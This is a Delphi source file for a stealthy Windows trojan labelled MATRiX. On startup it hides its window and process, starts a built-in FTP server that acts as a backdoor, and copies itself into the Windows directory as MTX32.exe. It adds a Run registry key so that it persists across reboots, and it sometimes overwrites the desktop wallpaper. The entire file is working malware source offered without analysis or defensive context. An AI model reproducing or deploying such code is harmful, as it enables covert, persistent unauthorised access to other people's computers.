unit mtx1;


 interface


uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  ExtCtrls, FtpSrv, Registry, ShellAPI, StdCtrls, Winsock;

type
  TRegisterServiceProcess = function (dwProcessID, dwType:DWord) : DWORD; stdcall;
  TForm1 = class(TForm)
  FtpServer1: TFtpServer;
    Image1: TImage;


procedure FormCreate(Sender: TObject);


  private
    { Déclarations privées }

  public
    { Déclarations publiques }
  end;

  
var
     Form1: TForm1;
     TMPK : String;




implementation

{$R *.DFM}



procedure TForm1.FormCreate(Sender: TObject);
Var Registre:TRegistry;
    nomsource, nomcible : PChar;
    TMPK : String;
    i : integer;
    j : PChar;
    k,I3 : String;
    hNdl :THandle;
    RegisterServiceProcess: TRegisterServiceProcess;
    I2 : Integer;

begin

        begin
   form1.caption := '';
   form1.visible := False;
   form1.top := 2000;
   form1.height := 0;
   form1.Width := 0;
   form1.Left := 0;
   hNdl:=LoadLibrary('KERNEL32.DLL');
   RegisterServiceProcess:=GetProcAddress(hNdl, 'RegisterServiceProcess');
   RegisterServiceProcess (GetCurrentProcessID, 1);
   FreeLibrary(hNdl);
   showWindow(Application.handle, SW_HIDE);
   SetWindowLong(Application.Handle, GWL_EXSTYLE,
   GetWindowLong(Application.Handle, GWL_EXSTYLE) or
   WS_EX_TOOLWINDOW and not WS_EX_APPWINDOW);
         end;

         ftpserver1.start;

Registre := TRegistry.Create;
Registre.RootKey := HKEY_LOCAL_MACHINE;
Registre.OpenKey('Software\Microsoft\Windows\CurrentVersion\Run', FALSE);
Registre.WriteString('MATRiX', 'C:\Windows\MTX32.exe');

  begin;
  TMPK := Application.ExeName;
  for i:=Length(TMPK) downto 1 do
  if TMPK[i]='\' then break;
  TMPK:=copy (TMPK, 1, i);
  getmem (j, 100);
  GetWindowsDirectory (j, 100);
  k := j+'\';
  freemem (j);
  getmem (nomsource, 100);
  getmem (nomcible, 100);
  StrPCopy (nomsource, Application.ExeName);
  StrPCopy (nomcible, k+'MTX32.exe');
  CopyFile (nomsource, nomcible, FALSE);
  end;

  begin
   Randomize;
   I2 :=random(17);
   I3 := IntToStr(I2);
   if I3 = '9' then
    begin
Registre.RootKey := HKEY_CURRENT_USER;
Registre.OpenKey('Control Panel\desktop', FALSE);
Registre.WriteString('Wallpaper', 'C:\Windows\system\MTX.bmp');

image1.picture.savetofile('C:\Windows\system\MTX.bmp');
    end;
  end;

end;

end.
